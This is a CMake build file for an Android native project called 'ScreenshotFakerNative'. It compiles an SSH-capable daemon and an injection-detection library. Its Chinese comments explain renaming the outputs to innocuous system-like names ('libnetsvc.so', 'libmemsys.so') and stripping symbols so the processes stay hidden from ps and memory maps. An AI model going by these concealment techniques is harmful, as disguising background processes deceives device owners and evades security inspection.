cmake_minimum_required(VERSION 3.22.1)
project("ScreenshotFakerNative")
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(OPENSSL_DIR ${CMAKE_SOURCE_DIR}/openssl)
set(LIBSSH2_DIR ${CMAKE_SOURCE_DIR}/libssh2)
add_executable(libdaemon daemon.cpp auxiliary.h)
# 输出名中性化（隐蔽性）：target 名保持 libdaemon 供维护者识别，
# 落盘文件名 libnetsvc.so——daemon 就地运行时其路径进入进程 cmdline
# （ps 全局可见），不得含 daemon/guard 等自曝字样。
# 注意：executable 目标的 OUTPUT_NAME 不自动加 lib 前缀，须写全 "libnetsvc"
set_target_properties(libdaemon PROPERTIES OUTPUT_NAME "libnetsvc" SUFFIX ".so")
target_include_directories(libdaemon PRIVATE ${OPENSSL_DIR}/include)
target_include_directories(libdaemon PRIVATE ${LIBSSH2_DIR}/include)
target_compile_options(libdaemon PRIVATE -fPIE -flto -fvisibility=hidden -ffunction-sections -fdata-sections)
target_link_options(libdaemon PRIVATE -pie -flto -Wl,--gc-sections -Wl,--strip-all -Wl,--exclude-libs,ALL -Wl,--discard-all)
target_link_libraries(libdaemon ${LIBSSH2_DIR}/lib/${ANDROID_ABI}/libssh2.a ${OPENSSL_DIR}/lib/${ANDROID_ABI}/libcrypto.a z -pthread)

# 注入检测雷管（JNI 库）：无第三方依赖，静默（strip-all 去符号，不链 log）
# 输出名中性化（隐蔽性）：落盘 libmemsys.so（maps 可见），target 名 guard 供维护者
add_library(guard SHARED guard.cpp)
set_target_properties(guard PROPERTIES OUTPUT_NAME "memsys")
target_compile_options(guard PRIVATE -fvisibility=hidden -ffunction-sections -fdata-sections)
target_link_options(guard PRIVATE -Wl,--gc-sections -Wl,--strip-all -Wl,--exclude-libs,ALL -Wl,--discard-all)